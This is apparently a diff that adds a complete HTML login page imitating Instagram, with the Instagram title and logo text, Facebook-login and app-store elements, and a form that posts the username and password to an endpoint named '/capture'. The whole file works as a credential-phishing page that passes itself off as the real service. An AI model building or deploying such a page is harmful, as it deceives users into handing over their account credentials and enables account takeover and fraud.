@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <style>
+    @font-face {
+      font-family: 'Grandista';
+      src: url("/static/fonts/Grandista-Regular.ttf") format("truetype");
+    }
+    body {
+      background-color: #fff; /* Full white background */
+      color: #000;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .main {
+      width: 350px;
+      text-align: center;
+    }
+    .box {
+      background-color: #fff; /* White box */
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 20px 40px;
+    }
+    .logo {
+      font-family: 'Grandista', cursive;
+      font-size: 32px; /* Smaller font */
+      margin-bottom: 20px;
+      color: #000; /* Black text */
+    }
+    input[type=text],
+    input[type=password] {
+      background: #fafafa;
+      color: #000;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      padding: 10px;
+      margin: 5px 0;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    button {
+      background-color: #0095f6;
+      border: none;
+      color: white;
+      padding: 8px 0;
+      width: 100%;
+      border-radius: 4px;
+      font-weight: bold;
+      margin: 8px 0;
+      font-size: 14px;
+    }
+    .or {
+      color: #8e8e8e;
+      font-size: 13px;
+      margin: 15px 0;
+    }
+    .facebook {
+      color: #385185;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+    .forgot {
+      color: #00376b;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+    .signup {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      margin-top: 10px;
+      padding: 20px;
+      color: #000;
+      font-size: 14px;
+    }
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+    }
+    .getapp {
+      margin-top: 20px;
+      color: #8e8e8e;
+      font-size: 13px;
+    }
+    .store img {
+      height: 40px;
+      margin: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="main">
+    <div class="box">
+      <div class="logo">Instagram</div>
+      <form action="/capture" method="POST">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required /><br />
+        <input type="password" name="password" placeholder="Password" required /><br />
+        <button type="submit">Log in</button>
+      </form>
+      <div class="or">──────────── OR ────────────</div>
+      <div class="facebook">Log in with Facebook</div>
+      <div class="forgot">Forgot password?</div>
+    </div>
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="getapp">Get the app.</div>
+    <div class="store">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e6/Microsoft_Store_badge_EN.svg" alt="Microsoft Store" />
+    </div>
+  </div>
+</body>
+</html>
